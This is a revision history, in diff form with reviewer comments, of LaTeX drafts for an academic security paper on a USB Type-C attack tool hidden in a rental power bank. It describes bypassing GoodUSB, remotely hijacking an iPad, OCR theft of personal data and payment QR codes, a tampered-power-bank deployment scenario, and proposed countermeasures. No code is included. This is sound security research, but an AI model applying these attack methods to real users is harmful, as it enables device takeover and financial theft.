+GoodUSB on the target device; as the GoodUSB is proposed in 2015, the code is
+outdated and cannot be executed at modern OS; so we have to home-brew a similar
+defense mechanism based on its paper~\cite{tian2015defending}.  At the
+beginning, our home-brewed version of GoodUSB asked victim to manually complete
+a CAPTCHA to  authorize the new USB device, a.k.a our \tool. But at this time,
+by the design of GoodUSB, \fengwei{The following sentence is hard to
+understand.} our \tool can already perform limited keystroke to complete the
+CAPTCHA and will be rejected only after the failure of authorization. With the
+video feedback from \tool, the attacker successfully completes the CAPTCHA.  Up
+to this point, the bypass of defense like GoodUSB is completed as our \tool
+gains full function from the GoodUSB and becomes a trusted device. Then, our
+\tool works similar to the original BadUSB, inserting keystroke to perform
+arbitrary execution on the laptop. We tested three scripts, ranging from
+reverse shell backdoor to malware payload execution, all of which resulting in
+success.  With this experiment, we have proven the defense bypassing is succeed
+using \tool. 
+%This also warned us that we need more thorough defense against such BadUSB
+%attack.
 
 \subsection{Remote control mode}
-To test the capability of remote control mode, we chose \textit{iPad Pro (3rd generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target device in this experiment.
-Besides disguising as normal HID devices like a conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video stream from the target device to the attacker via WiFi.
-After the connection establishment, attacker performed a series actions to test the capability of \tool.
-At the beginning, attacker accessed album application on the iPad and obtained all the photos inside.
-After that, attacker tried to send messages via victim's account.
-At last, attacker performed a small amount of transaction using the financial application.
-All of these tests resulted in success and proved that \tool is a powerful attack tool.
+\fengwei{In BadUSB-C section, remote control model is after privacy extraction mode.}
 
-Through this experiment, we have found that with video transmission and mouse emulation, \tool extensively expanded the attack surface of BadUSB attack, especially in mobile devices.
-We have archived complete hijack of victim's device in this experiment.
+To test the capability of remote control mode, we chose \textit{iPad Pro (3rd
+generation)}, a tablet in iOS 14.3 with a USB Type-C interface, as the target
+device in this experiment.  Besides disguising as normal HID devices like a
+conventional BadUSB~\cite{badusb}, \tool also transmitted real-time video
+stream from the target device to the attacker via WiFi.  After the connection
+establishment, attacker performed a series actions to test the capability of
+\tool. At the beginning, attacker accessed album application on the iPad and
+obtained all the photos inside. After that, attacker sent messages via victim's
+account. At last, attacker performed a small amount of transaction using the
+financial application. All of these tests resulted in success.
+
+Through this experiment, we have found that with video transmission and mouse
+emulation, \tool extensively expanded the attack capability of BadUSB,
+especially in mobile devices. We have archived complete hijack of victim's
+device in this experiment.
 
 \subsection{Privacy extraction mode}
-During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the target device.
-In privacy extraction mode, \tool passively captured video from the victim's device and used \textit{OpenCV} to identify valuable information from video stream.
-When the victim viewed text or photos with text, \tool used the techniques of optical character recognition (OCR) to extract text from corresponding video frames.
-In this experiment, attacker had successfully extracted text like name, address, ID number and other valuable personal information.
-We also tested the payment code extractor, which enables attacker to identify payment code in the video stream and perform transaction without password.
-As this is also a part of our case study, more details about the data extracted can be found in Section~\ref{subsec:case_study} and Table~\ref{table:information_extracted}.
 
-After the experiment, we have found that as privacy extraction mode only passively process victim's video stream, this is a more power-efficient mode than remote control mode.
+During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a
+smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the
+target device.  In the privacy extraction mode, \tool passively captured video
+from the victim's device and used \textit{OpenCV} to identify valuable
+information from video stream.  When the victim viewed text or photos with
+text, \tool used the techniques of Optical Character Recognition (OCR) to
+extract text from corresponding video frames.  In this experiment, attacker had
+successfully extracted text like name, address, ID number and other sensitive
+personal information. We also tested the payment code extractor, which enables
+attacker to identify payment code in the video stream and perform transaction
+without password. As this is also a part of our case study, more details about
+the data extracted can be found in Section~\ref{subsec:case_study} and
+Table~\ref{table:information_extracted}.
+
+\fengwei{I don't understand the following sentence. Both modes need to capture
+the video stream. Don't understand why it is more power-efficient.} After the
+experiment, we have found that as privacy extraction mode only passively
+process victim's video stream, this is a more power-efficient mode than remote
+control mode.
 
@@
 \subsubsection{Background}
-We first introduce the technical background of our case study, sharing power bank service and QR code payment.
 
-\textbf{Sharing Power Bank}.
-Sharing power bank provides users with short-term rental of power banks.
-The company deploys power bank stations in the city and users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to the near station and pay the rent fee.
+We first introduce the technical background of our case study, sharing power
+bank service and QR code payment.
 
-For an example, Brick is such a power bank sharing service provider from Sweden.
-It provides power bank rental service all over the Sweden and is planning on expanding their service around Europe.
-What's more, this service is even more popular in China, there are these stations being deployed in almost every market, store and even newsstand.
-This suggests that this service is becoming more and more common around the global, especially in China and Europe.
+\textbf{Sharing Power Bank}.  Sharing power bank provides users with short-term
+rental of power banks.  The company deploys power bank stations in the city and
+users can rent a power bank from any of the power bank station, charge their
+device on the trip, return the rented power bank to the near station and pay
+the rental fee.
+
+For an example, Brick\fengwei{reference?} is such a power bank sharing service
+provider from Sweden. It provides power bank rental service all over the Sweden
+and is planning on expanding their service around Europe. Moreover, this
+service is even more popular in Asia, power bank stations are deployed in
+markets, stores, and even newsstands. 
+%This suggests that this service is becoming more and more common around the global, especially in Asia and Europe.
 \shuqing{I think we should paraphrase instead of using the descriptions on the website directly. Just to explain \textbf{what we need}.}
 
+\fengwei{Explain the figure in the text.}
 \begin{figure}[t]
@@
 
-Not only does sharing power bank provides convenience to users, but it also brings security issues. 
-We noticed that most of the power bank stations do not check the integrity of power banks during the rental process, and users are hardly cautious to check the power banks when connecting their devices.
-An attacker are able to modify his/her rented power banks and return it to a power bank station causing potential threat to subsequent users.
+Not only does sharing power bank provides convenience to users, but it also
+brings security issues.  We noticed that most of the power bank stations do not
+check the integrity of power banks during the rental process, and users are
+hardly cautious to check the power banks when connecting their devices.  An
+attacker is able to tamper rented power banks and return it to a power bank
+station causing potential threat to subsequent users.
 
 \textbf{QR Code Payment}.
-QR code payment is a new type of payment method that are popular in China.
-Its most well known cases are WeChat Pay and Alipay.
+QR code payment is a new type of payment method that are popular in Asia.
+Its most well known cases are WeChat Pay and Alipay\fengwei{reference?}.
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-This explains why it becoming widely used in China.
 QR code payment is typically performed in the following steps:
@@
 
-In the real-world scenario, some payment service providers provide special rules for micropayment purchases.
-A micropayment is pre-determined by the payment service provider with thresholds in the user agreement.
-For example, WeChat Pay~\cite{Wechat-pay} regards transaction under USD \textdollar 154 as micropayments.
-Different from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without clients' permission which aims to provide convenience to both merchant and client.
-If a victim's payment code is leaked to the attackers, they can use the that code to authorize multiple micropayments without permission.
-In order to prevent such cases, both Alipay and WeChat Pay has designed a refreshing mechanism for the payment code, which is to refresh the QR code every minute.
-This is sufficient to stop attack like sneak shots, but unable to stop real-time attack like our \tool.
-In summary, the payment QR code is highly sensitive on users' devices and our following case study is about how to obtain this code using modified power bank, our \tool.
+In the real-world scenario, some payment service providers use special rules
+for micropayment purchases.  A micropayment is pre-determined by the payment
+service provider with thresholds in the user agreement.  For example, WeChat
+Pay~\cite{Wechat-pay} regards transaction under USD \textdollar 154 as
+micropayments.  Different from a typical payment procedure, when micropayments
+are made, confirmations can be applied automatically without clients'
+permission which aims to provide convenience to both merchant and client.  If a
+victim's payment code is leaked to the attackers, they can use the that code to
+authorize multiple micropayments without permission.  In order to prevent such
+cases, both Alipay and WeChat Pay has designed a refreshing mechanism for the
+payment code, which is to refresh the QR code every minute. This is sufficient
+to stop attack like sneak shots, but unable to stop real-time attack like our
+\tool.  In summary, the payment QR code is highly sensitive on users' devices
+and our following case study is about how to obtain this code using an
+attacker-crafted power bank via \tool.
 
 \subsubsection{Attack Scenario}
-In this part, we will introduce a real life attack scenario to prove that our \tool is a practical offensive tool.
-This scenario can be decomposed into the following steps.
+
+In this part, we will introduce a real life attack scenario to show that our
+\tool is a practical offensive tool.  This scenario can be decomposed into the
+following steps.
+
 \begin{enumerate}[I. ]
-	\item The attacker rents a power bank from one of power bank stations and replace the internal components with our \tool.
-	\item After the modification, \tool is returned to another power bank station in a crowded area like airport or railway station, which increases the probability of success.
-	\item Other users borrows the modified power bank and connects it to their own devices, becoming the victim of \tool.
+	\item The attacker rents a power bank from one of power bank stations and replaces the internal components with \tool.
+	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like airport or railway station, which increases the probability of success.
+	\item a user borrows the modified power bank and connects it to her own device, becoming the victim of \tool.
 	\item The attacker now has complete control over victim and can perform various attack using different modes.
 \end{enumerate}
+
 Here we summarizes the possible threats toward user under different modes. \hongyi{Better way to express this?}

### 2021-01-27 WOOT/BadUSBC.tex
Add abstract

@@
 \begin{abstract}
-\outline{Brief intro of USB protocol}\\
-\outline{Brief intro of Rubber Ducky}\\
-\outline{What have we done, our contribution}\\
-\outline{Our experiment/case study, Attack of shops}\\
+The security of USB protocol has been paid closed attention to, despite its wide usage.
+Due to the \textit{trust-by-default} characteristics, USB security has caused serious problems.
+For example, a well-known firmware attack, BadUSB, performs malicious operations on the victim hosts through disguising normal USB devices as human interface devices like keyboards and mice.
+However, BadUSB suffers from several limitations.
+Attackers cannot obtain the status of user interface to conduct precise attacks, and they may be detected by multiple effective countermeasures.
+In this work, we extended BadUSB to support the new features of USB Type-C and proposed a multi-mode attack model, \tool.
+It can obtain UI status to make attacks more precise and effective, and also bypass many existing defence methods for BadUSB.
+To our best knowledge, \tool is the first attack model utilizing USB Type-C.
+To validate the usability and effectiveness, we conducted multiple experiments and a user study, in which we got valuable results.
+We also proposed reasonable countermeasures for our attack model, which may be inspiring for future research on defence methods.
 \end{abstract}
@@
 \begin{IEEEkeywords}
-USB;BadUSB
+USB;BadUSB;
 \end{IEEEkeywords}

### 2021-01-27 WOOT/Files/introduction.tex
Add abstract

@@
 Combining it with simulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.
-We did experiments to verify that \tool could also bypass most of the countermeasures for BadUSB since they often rely on interaction with the graphical interface.
+We did experiments to verify that \tool could also bypass many countermeasures for BadUSB since they often rely on interaction with the graphical interface.
 Moreover, we implemented multiple attacking modes of USB attacks based on our approach to verify its effectiveness, including scripting, remote control, and privacy extraction.
@@
 	The combination of new support with conventional BadUSB makes attacks more precise and effective.
-	\item Our approach can bypass most of the previous countermeasures of BadUSB.
+	\item Our approach can bypass many previous countermeasures of BadUSB.
 	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool.

### 2021-01-27 WOOT/Files/related_work.tex
fix defence

@@
 From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which
-are defined by protocol to transmitting data.  Without these pins, data can't
-\fengwei{use "cannot" instead of "can't"} be transferred via USB cable. Based
-on this fact, USB Condom \cite{Condom} is a hardware solution to block data
+are defined by protocol to transmitting data.  Without these pins, data cannot
+be transferred via USB cable. Based
+on this fact, USB Condom~\cite{Condom} is a hardware solution to block data
 channel by adding blocker in the connector. This blocker can cut off the `D-'
@@
 this drawback. For instance, Mohammadmoradi et
-al.\cite{mohammadmoradi2018making} propose a strategy to generate such a
+al.~\cite{mohammadmoradi2018making} propose a strategy to generate such a
 whitelist automatically. This strategy first generates a unique fingerprint for
@@
 
-To solve this flaw, GoodUSB~\cite{tian2015defending} will\fengwei{Don't use
-future tense. We can just use present tense.} report the functionality claimed
+To solve this flaw, GoodUSB~\cite{tian2015defending} reports the functionality claimed
 by the device to user and let user decides whether to authorize. When a device
@@
 of academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL
+exist an attack called JFC (juicy film charging)~\cite{JFC} which abuses the MHL
 standard to steal video stream from the victim. In order to mitigate this
-issue, Meng et al.\cite{meng2018252} proposed a statistical model using status
+issue, Meng et al.~\cite{meng2018252} proposed a statistical model using status
 like GPU/CPU usage to detect JFC attack.
@@
 
-\fengwei{The table exceeds the max size.}
 \newcommand{\circlefull}{\includegraphics[scale=0.025]{Figs/circle_full.png}}
@@
 		\hline
-		\diagbox[width=1.52in] {Defence}{Attack} & \makecell*[c]{Facedancer\cite{facedancer},\\ Syzkaller\cite{syzkaller}} & \cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu},\cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \tool \\
+		\diagbox[width=1.52in,height=0.4in] {Defence}{Attack} & \makecell*[c]{Facedancer~\cite{facedancer},\\ Syzkaller~\cite{syzkaller}} &\cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC~\cite{JFC}&		\makecell{
+			Duqu~\cite{duqu}, \\
+			\cite{brain, stuxnet, conficker,flame}} &\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \tool \\
 		\hline
-		\makecell{USB condom \cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull&  \circleempty&\circlefull\\
+		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull&  \circleempty&\circlefull\\
 		\hline
 		\makecell{
-			Windows Defender ATP\cite{windenfenderwhite}, \\
-			Mohammadmoradi et al.\cite{mohammadmoradi2018making}, \\
-			TMSUI\cite{yang2015tmsui}
+			Windows Defender ATP~\cite{windenfenderwhite}, \\
+			Mohammadmoradi et al.~\cite{mohammadmoradi2018making}, \\
+			TMSUI~\cite{yang2015tmsui}
 		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circleempty&  \circleempty &\circlehalf\\
@@
 		\hline
-		\makecell{GoodUSB\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty&  \circleempty &\circleempty\\
+		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty&  \circleempty &\circleempty\\
 		\hline
 
-		\makecell{Neuner et al.\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
 		\hline
-		\makecell{Pham et al. \cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
 		\hline
-		\makecell{JFCGuard\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
+		\makecell{JFCGuard~\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
 			\hline

### 2021-01-28 WOOT/BadUSBC.tex
Minor
comments for abstract.

@@
 \begin{abstract}
-The security of USB protocol has been paid closed attention to, despite its wide usage.
+The security of USB protocol has been paid extensive attention to, despite its wide usage.
 Due to the \textit{trust-by-default} characteristics, USB security has caused serious problems.
@@
 In this work, we extended BadUSB to support the new features of USB Type-C and proposed a multi-mode attack model, \tool.
-It can obtain UI status to make attacks more precise and effective, and also bypass many existing defence methods for BadUSB.
+It can obtain UI status to make attacks more precise and effective, and also bypass existing defense methods for BadUSB.
 To our best knowledge, \tool is the first attack model utilizing USB Type-C.
-To validate the usability and effectiveness, we conducted multiple experiments and a user study, in which we got valuable results.
-We also proposed reasonable countermeasures for our attack model, which may be inspiring for future research on defence methods.
+To validate the usability and effectiveness, we conducted extensive experiments and a user study, in which 
+\fengwei{What results?}we got valuable results.
+\fengwei{what countermeasures do we propose? including isolated UI rendering.}
+We also proposed reasonable countermeasures for our attack model, which may be inspiring for future research on defense methods.
 \end{abstract}

### 2021-01-28 WOOT/Files/experiment.tex
[experiment] fix figure
[experiment] figure of PBS
fix some suggestions in imple

@@
 in any electronic store. Here we choose the following parts to build a
-prototype. To begin with, we choose the Raspberry Pi 4B as the embedded
+prototype. To begin with, we choose the Raspberry Pi 4B~\cite{pi4b} as the embedded
 computer inside \tool, which is powerful enough to process video data and has
-onboard WiFi chip. As for the HID emulator, we decide to use a ATMEGA32U4 board
+onboard WiFi chip. As for the HID emulator, we decide to use a ATMEGA32U4 board~\cite{atmel}
 with USB protocol support. This Atmel chip is able to emulate most HID devices
 with our modified firmware. About the USB 3.x hub, we uses one from the
-Yamazawa, which supports HDMI, USB 2.0, and many other exported peripheral.
+UGREEN, which supports HDMI, USB 2.0, and many other exported peripheral.
 Apart from these essential parts, we also uses an auxiliary power-bank to
@@
 	\caption{\tool}
-	\label{fig:PBS_products}
+	\label{fig:armory}
 \end{figure}

### 2021-01-28 WOOT/Files/countermeasure.tex
[algorithm]fix
minor change of related work
Figure
[countermeasure] isolated_rendering
Update abs and countermeasures
pass on coutermeasures. some of the coutermeasure text was over-written.

@@
 \label{sec:countermeasures}
-Authorization mechanism like GoodUSB\cite{tian2015defending} has been proposed as a countermeasure against BadUSB attack.
-But as mentioned in Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on internal display to request for authorization, which can be hijacked by our \tool.
-Hence, GoodUSB is indeed a great defense against traditional BadUSB attack but no defense at all for our \tool.
-Here we discuss some effective countermeasures against \tool.
 
-\textbf{External Hardware Authorization.}
-One possible countermeasure is to introduce external hardware completing the authorization process.
-Contrary to the GoodUSB, USBCheckIn\cite{usbcheckin} adopts a dedicated hardware between the host and device.
-When a device is plugged in, the authorization will be complete on the dedicated hardware instead of internal display, preventing the host from being hijacked.
-Though USBCheckIn is a adequate defense against \tool, the external hardware brings additional cost and inconvenience, especially for mobile device.
+Authorization mechanisms like GoodUSB~\cite{tian2015defending} have been
+proposed as countermeasures against the BadUSB attack. As mentioned in
+Section~\ref{sec:badusb} and Section~\ref{sec:experiment}, GoodUSB relies on
+internal display for authorization, which can be bypassed via our \tool. 
+%Hence, GoodUSB is indeed a great defense against traditional BadUSB attack but
+%no defense at all for our \tool. 
+Next, we discuss some effective countermeasures against \tool.
 
-\textbf{Distrust-by-Default.}
-Most security issues of USB protocol is due to its \textit{trust-by-default} policy.
-\tool also relies on this feature to work.
-Hence if we reject all \textit{unauthorized} device, \tool and other many USB attacks will fail.
-It is worth mentioning here that \textit{distrust-by-default} policy is not the same as GoodUSB\cite{tian2015defending}.
-GoodUSB relies on the \textit{unauthorized} device to complete its own authorization, while in this strict policy, users have to use an \textit{authorized} device.
-Though \textit{distrust-by-default} policy effectively prevents these attack, this also causes considerable inconvenience for users.
-For example, when there is no other \textit{authorized} device plugged, it is impossible for user to complete the authorization in the first place.
-Thus this strict policy is far from optimal in most use cases.
+\textbf{External Hardware Authorization.} One possible countermeasure is to
+introduce external hardware completing the authorization process. Contrary to
+the GoodUSB, USBCheckIn~\cite{usbcheckin} adopts a dedicated hardware between
+the host and device. When a device is plugged-in, the authorization will be
+conducted on the dedicated hardware instead of the internal display, preventing
+the host from being hijacked. Though USBCheckIn is an adequate defense against
+\tool, the external hardware brings additional cost and inconvenience,
+especially for mobile devices.
 
-\textbf{Isolated UI Rendering}
-During our experiment, we noticed that \tool is actually unable to redirect out the locking screen keyboard from the iPad OS.
-Instead, the keyboard is only available on the internal display.
-However, this defense is only enabled on the locking screen keyboard, other virtual keyboard is still vulnerable to our \tool.
-This mechanism has inspired us to propose a new defense against our \tool called \emph{Isolated UI Rendering}.
-As illustrated in Figure~\ref{fig:isolated_ui}, we designed two separated UI render driver, one is secure the other is insecure.
-When an application require to render, it can pass the content along with a tag identifying whether the content is ``sensitive'' or not.
-If the content is tagged with ``sensitive'', then the OS will only pass it to the secure driver, which only trusts the internal display.
-On the other hand, if the content is tagged with ``insensitive'', then it will be passed to both secure and insecure driver, rendered on both internal and external display.
-\begin{figure}[htbp]
+\textbf{Distrust-by-Default.} Most security issues of USB protocol are due to
+its {trust-by-default} assumption; \tool also relies on this feature to work.
+To defend against \tool and other USB-based attacks, we can simply reject all
+{unauthorized} device -- applying the \textit{distrust-by-default} policy.  It
+is worth mentioning that \textit{distrust-by-default} policy is not the same as
+GoodUSB~\cite{tian2015defending}.  \fengwei{the following sentence needs to be
+written. I am confused.} GoodUSB relies on the {unauthorized} device to
+complete its own authorization, while in this strict policy, users have to use
+an {authorized} device. Though \textit{distrust-by-default} policy effectively
+prevents these attacks, it also causes considerable inconvenience for users.
+For example, when there is no other {authorized} device plugged, it is
+impossible for users to complete the authorization in the first place. Thus
+this strict policy is far from optimal in most use cases.
+
+\textbf{Isolated UI Rendering.} During our experiments, we noticed that \tool
+is actually unable to redirect out the locking screen keyboard from the iPad
+OS. Instead, the keyboard is only available on the internal display. However,
+this defense is only enabled on the locking screen keyboard, other keyboards
+(e.g., the virtual ones used by the apps) are still vulnerable to our \tool.
+This mechanism has inspired us to propose a new defense against our \tool
+called \emph{Isolated UI Rendering}. As illustrated in
+Figure~\ref{fig:isolated_ui}, we designed two separated UI render driver, one
+is secure the other is insecure. When an application require to render, it can
+pass the content along with a tag identifying whether the content is
+``sensitive'' or not. If the content is tagged with ``sensitive'', then the OS
+will only pass it to the secure driver, which only shows the sensitive content
+(e.g., a keyboard) on the internal display. For the rest of the rendering, it
+would render on both internal and external display (e.g., insensitive
+contents). \fengwei{we need more text to describe the figure}.
+
+\begin{figure}[t]
 	\centering
 	\includegraphics[width=\linewidth]{./Figs/isolated_ui.png}
-	\caption{Isolated UI Rendering}\shuqing{Maybe we can increase the font?}
+	\caption{Isolated UI Rendering}%\shuqing{Maybe we can increase the font?}
 	\label{fig:isolated_ui}
 \end{figure}
-
-\begin{algorithm}[H]
-	\SetAlgoLined
-	\KwData{Application UI Content}
-	\For{component C in content}{
-		\eIf{C.tag is sensitive}{
-			Send $C$ to secure driver
-		}{
-			Send $C$ to both drivers
-		}
-	}
-	\caption{Isolated UI Render}
-\end{algorithm}
+\fengwei{what are untrusted and trusted screens? are they internal and external displays?}

### 2021-01-28 WOOT/Files/conclusion.tex
complete conclusion part

@@
 \outline{Conclusion}
+Leveraging the new features of USB 3.x~\cite{usb31,usb31,usb32}, we explore a new attack scheme named \tool and three useful attack modes.
+Each of these three modes has its own strength and use case.
+The scripting mode largely extends the original BadUSB and successfully bypasses existing defenses.
+The privacy extraction mode proved practical and powerful in the user study, as it extracts victim's privacy in a stealth way.
+The remote control mode archives complete hijack of target device, allowing us to perform various type of subsequent attacks.
+By experimenting \tool in three different devices, we further tests its ability under different mode and proves it can indeed bypass certain defense like GoodUSB~\cite{tian2015defending}.
+In user study, we obtains and analyzes video stream extracted from 10 participant with \tool, which demonstrates its capability in real life scenario.
+In the end, we propose a new defense scheme named \textit{isolated UI rendering}, which can effectively stop our \tool.
+
+As future work, we decide to further explore the potential of \textit{isolated UI rendering} and implement it on a customized operating system.
+Moreover we also hope to lower the power and network requirement of \tool to make it more practical.

### 2021-01-28 WOOT/Files/countermeasure.tex
complete conclusion part

@@
 \textbf{Distrust-by-Default.} Most security issues of USB protocol are due to
-its {trust-by-default} assumption; \tool also relies on this feature to work.
+its \textit{trust-by-default} assumption; \tool also relies on this feature to work.
 To defend against \tool and other USB-based attacks, we can simply reject all
@@
 GoodUSB~\cite{tian2015defending}.  \fengwei{the following sentence needs to be
-written. I am confused.} GoodUSB relies on the {unauthorized} device to
-complete its own authorization, while in this strict policy, users have to use
-an {authorized} device. Though \textit{distrust-by-default} policy effectively
+written.
+I am confused.}\hongyi{Fixed, use more concise sentences} GoodUSB permits limited functionality of untrusted devices while this strict policy forbids all functions of an untrusted device.
+Though \textit{distrust-by-default} policy effectively
 prevents these attacks, it also causes considerable inconvenience for users.
-For example, when there is no other {authorized} device plugged, it is
-impossible for users to complete the authorization in the first place. Thus
-this strict policy is far from optimal in most use cases.
 
@@
 called \emph{Isolated UI Rendering}. As illustrated in
-Figure~\ref{fig:isolated_ui}, we designed two separated UI render driver, one
+Figure~\ref{fig:isolated_ui}, we designed two separated UI render layer and corresponding driver, one
 is secure the other is insecure. When an application require to render, it can
@@
 ``sensitive'' or not. If the content is tagged with ``sensitive'', then the OS
-will only pass it to the secure driver, which only shows the sensitive content
-(e.g., a keyboard) on the internal display. For the rest of the rendering, it
-would render on both internal and external display (e.g., insensitive
-contents). \fengwei{we need more text to describe the figure}.
+will only render it on the secure layer, which only shows the sensitive content
+(e.g., a keyboard) on the trusted screen. For the rest of the rendering, it
+would render on both trusted and untrusted display (e.g., insensitive
+contents).
+For example, in Figure~\ref{fig:isolated_ui}, the `password' and `keyboard' are recognized as sensitive while other parts of content are in sensitive.
+Thus, the `password' and `keyboard' are not rendered on untrusted screen as they contains private information.
+ \fengwei{we need more text to describe the figure}.
 
@@
 \fengwei{what are untrusted and trusted screens? are they internal and external displays?}
+\hongyi{Fixed by using the same term and additional description}

### 2021-01-28 WOOT/Files/experiment.tex
fix some suggestions in imple
complete conclusion part

@@
 with our modified firmware. About the USB 3.x hub, we uses one from the
-UGREEN, which supports HDMI, USB 2.0, and many other exported peripheral.
+UGREEN~\cite{ugreen}, which supports HDMI, USB 2.0, and many other exported peripheral.
 Apart from these essential parts, we also uses an auxiliary power-bank to
@@
 \fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
-2, 3, 4, and 5?}
+2, 3, 4, and 5?}\hongyi{Is the caption sufficient? If explain here, I feel quite redundant}
 
 \begin{figure}[t]
-	\centering
-	\includegraphics[width=.98\linewidth]{./Figs/armory_all.png}
+	\includegraphics[width=.98\linewidth]{./Figs/armory_all.png}\\
+	\begin{tabular}{ll}
+	\mycircled{A}Victim's Device    &\mycircled{B}\tool\\
+	\mycircled{1}USB 3.x Hub        &\mycircled{2}Raspberry Pi 4B\\
+	\mycircled{3}Auxiliary Power Bank &\mycircled{4}Video Capture\\
+	\mycircled{5}ATMEGAA32U4 Board
+	\end{tabular}
+
 	\caption{\tool}
@@
 
+\subsection{Privacy extraction mode}
+
+During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a
+smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the
+target device.  In the privacy extraction mode, \tool passively captured video
+from the victim's device and used \textit{OpenCV} to identify valuable
+information from video stream.  When the victim viewed text or photos with
+text, \tool used the techniques of Optical Character Recognition (OCR) to
+extract text from corresponding video frames.  In this experiment, attacker had
+successfully extracted text like name, address, ID number and other sensitive
+personal information. We also tested the payment code extractor, which enables
+attacker to identify payment code in the video stream and perform transaction
+without password. As this is also a part of our case study, more details about
+the data extracted can be found in Section~\ref{subsec:case_study} and
+Table~\ref{table:information_extracted}.
+
+\fengwei{I don't understand the following sentence. Both modes need to capture
+the video stream. Don't understand why it is more power-efficient.}
+\hongyi{Reasonable, changed to other advantage} 
+After the
+experiment, we have found that as privacy extraction mode only needs to
+process victim's video stream locally, it does not need to transmit the real-time video back to the attacker. This mode is useful when there is no stable network connection between \tool and attacker.
+
 \subsection{Remote control mode}
@@
 device in this experiment.
-
-\subsection{Privacy extraction mode}
-
-During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a
-smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the
-target device.  In the privacy extraction mode, \tool passively captured video
-from the victim's device and used \textit{OpenCV} to identify valuable
-information from video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of Optical Character Recognition (OCR) to
-extract text from corresponding video frames.  In this experiment, attacker had
-successfully extracted text like name, address, ID number and other sensitive
-personal information. We also tested the payment code extractor, which enables
-attacker to identify payment code in the video stream and perform transaction
-without password. As this is also a part of our case study, more details about
-the data extracted can be found in Section~\ref{subsec:case_study} and
-Table~\ref{table:information_extracted}.
-
-\fengwei{I don't understand the following sentence. Both modes need to capture
-the video stream. Don't understand why it is more power-efficient.} After the
-experiment, we have found that as privacy extraction mode only passively
-process victim's video stream, this is a more power-efficient mode than remote
-control mode.
 

### 2021-01-28 WOOT/Files/conclusion.tex
quick pass on discussion and conclusion.

--- 2020-12-22 WOOT/Files/conclusion.tex
@@
 \outline{Conclusion}
+
+Leveraging the new features of USB 3.x~\cite{usb31,usb31,usb32}, we explore a
+new attack scheme named \tool and three attack modes. Each of these three modes
+has its own strength and use scenarios. The scripting mode largely extends the
+original BadUSB and successfully bypasses existing defenses. The privacy
+extraction mode proved practical and powerful in the user study, as it extracts
+victim's sensitive information in a stealthy way. The remote control mode
+archives complete hijack of the target device, allowing us to perform various
+type of subsequent attacks. By experimenting \tool with mobile phones, tablets,
+and PCs, we further tests its ability under different mode and proves it can
+bypass defenses such as GoodUSB~\cite{tian2015defending}. In our user study, we
+obtains and analyzes video stream extracted from 10 participants with \tool,
+which demonstrates its capability in a real-life scenario. In the end, we
+propose a new defense scheme named \textit{isolated UI rendering}, which can
+effectively stop our \tool.
+
+As future work, we will further explore the potential of \textit{isolated UI
+rendering} and implement it on a customized operating system. Moreover we also
+hope to lower the power consumption for network transmission in \tool to make
+it more practical.

### 2021-01-28 WOOT/Files/discussion.tex
quick pass on discussion and conclusion.

@@
 \subsection{Limitation}
-There exist multiple limitations of \tool.
-To begin with, \tool can only gain the information and control access of the host itself instead of external hardware.
-Consequently, as we introduced in the Section\ref{sec:countermeasures}, \tool can hardly bypass the defence approaches which use external hardware for authorization.
-Moreover, most of the devices will prompt users to give authentication to the USB devices or select one of the functional modes after they are plugged in.
